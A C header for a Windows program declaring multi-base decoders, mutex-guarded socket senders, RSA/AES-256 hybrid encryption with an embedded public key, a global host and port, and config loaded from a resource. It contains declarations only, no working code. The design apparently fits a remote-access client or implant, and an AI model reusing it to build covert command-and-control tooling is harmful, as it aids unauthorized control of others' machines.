#ifndef UTILS_H
#define UTILS_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Base Encoding/Decoding
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length);
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);
unsigned char* base16_decode(const char* data, size_t input_length, size_t* output_length);
unsigned char* base32_decode(const char* data, size_t input_length, size_t* output_length);
unsigned char* base58_decode(const char* data, size_t input_length, size_t* output_length);
unsigned char* base62_decode(const char* data, size_t input_length, size_t* output_length);
unsigned char* base85_decode(const char* data, size_t input_length, size_t* output_length);
unsigned char* base91_decode(const char* data, size_t input_length, size_t* output_length);

// String helpers
char* str_replace(const char* orig, const char* rep, const char* with);
void str_trim(char* s);

// Networking helper
void sock_send(SOCKET sock, HANDLE mutex, const char* msg);
void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg);

// Hybrid Encryption
#define RSA_PUB_KEY "-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuYRrLUofWNv/EU3mNLah\n"\
"JQb9i7dbOi35/KGzyYsPd2HcufAa36GvQowUhGQyIWDfXqes7MkTQOE6/oNed1Ri\n"\
"QqNJBI7dexup5W54G4NIzl8BuY34A0jxsrKvZ5ZfYm/hDXMG7i1Qmqz3q7YU4AMH\n"\
"lpIZkfHgcvDNTj5AosN88HRgvfo8M8l8U8+jdCbJa4LSBS7Q0gYwuzUJedm6Cw9Y\n"\
"MgSxi1Dlgy/t6S3M2bPx2EFGQttagPBL8LFT+kGPQSsRpTkniNLOME8Bmk5muQCV\n"\
"JIJDxn9zppu5zYYcDgzQLRPfN+VxoVIby9JapCMQBELyM2KponzjW7TEOKHkjRql\n"\
"9QIDAQAB\n"\
"-----END PUBLIC KEY-----"

typedef struct {
    unsigned char key[32];
    unsigned char iv[16];
} SessionKey;

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem);
char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv);
unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv);

// Time helpers
void get_formatted_time(unsigned long long secs, char* out_buf);

// Config
extern char g_host[256];
extern int g_port;
void load_config_from_resource();
void transparent_decryption();

#endif
